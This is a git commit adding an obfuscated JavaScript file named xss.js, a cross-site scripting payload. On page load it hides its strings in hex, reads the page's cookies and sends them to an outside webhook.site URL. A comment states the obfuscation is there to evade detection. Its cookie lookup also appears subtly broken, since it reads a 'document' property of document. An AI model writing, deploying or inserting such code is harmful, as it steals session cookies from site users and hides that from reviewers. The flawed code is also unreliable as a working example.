e3483b0a03789b4699dde8bd25b116bfa7cb710a
Neha Iftikhar <116973383+nehaiftikhar@users.noreply.github.com>
2025-06-03 15:32:30 +0500

    xss.js

---
+++ xss.js
@@ -0,0 +1,9 @@
+// Obfuscated to bypass simple detection
+(function(){
+  var _0x3c2a=["\x64\x6F\x63\x75\x6D\x65\x6E\x74","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x63\x6F\x6F\x6B\x69\x65","\x66\x65\x74\x63\x68","\x44\x4F\x4D\x43\x6F\x6E\x74\x65\x6E\x74\x4C\x6F\x61\x64\x65\x64"];
+  window[_0x3c2a[4]]=function(){
+    var _0x5a2d=document[_0x3c2a[0]][_0x3c2a[2]];
+    window[_0x3c2a[3]]("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823?c="+_0x5a2d,{mode:"no-cors"});
+  };
+  document[_0x3c2a[1]](_0x3c2a[4],window[_0x3c2a[4]]);
+})();
